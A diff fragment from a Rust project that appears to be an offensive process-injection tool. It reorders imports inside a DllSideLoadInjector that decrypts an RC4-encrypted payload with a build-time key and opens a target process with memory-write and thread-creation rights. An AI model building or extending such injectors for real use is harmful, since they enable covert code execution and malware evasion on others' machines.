@@ -206,10 +206,13 @@ fn rc4_encrypt(plaintext: &[u8], key: &[u8]) -> Vec<u8> {
 impl crate::injection::Injector for DllSideLoadInjector {
     fn inject(&self, pid: u32, payload: &[u8]) -> Result<()> {
         use crate::injection::payload_has_valid_pe_headers;
-        use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
         use crate::win_types::PAGE_READWRITE;
+        use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
         const SYNCHRONIZE: u32 = 0x00100000;
-        use windows_sys::Win32::System::Threading::{PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE};
+        use windows_sys::Win32::System::Threading::{
+            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
+            PROCESS_VM_READ, PROCESS_VM_WRITE,
+        };
 
         // ── 1. Derive the decryption key from the build-time seed ──────────
         let key = derive_payload_key();
@@ -462,9 +465,12 @@ impl DllSideLoadInjector {
         export_config: &ExportConfig,
     ) -> Result<()> {
         const SYNCHRONIZE: u32 = 0x00100000;
-        use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
-        use windows_sys::Win32::System::Threading::{PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE};
         use crate::win_types::PAGE_READWRITE;
+        use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ};
+        use windows_sys::Win32::System::Threading::{
+            PROCESS_CREATE_THREAD, PROCESS_QUERY_INFORMATION, PROCESS_VM_OPERATION,
+            PROCESS_VM_READ, PROCESS_VM_WRITE,
+        };
 
         // ── 1. Derive key and decrypt payload ─────────────────────────────
         let key = derive_payload_key();
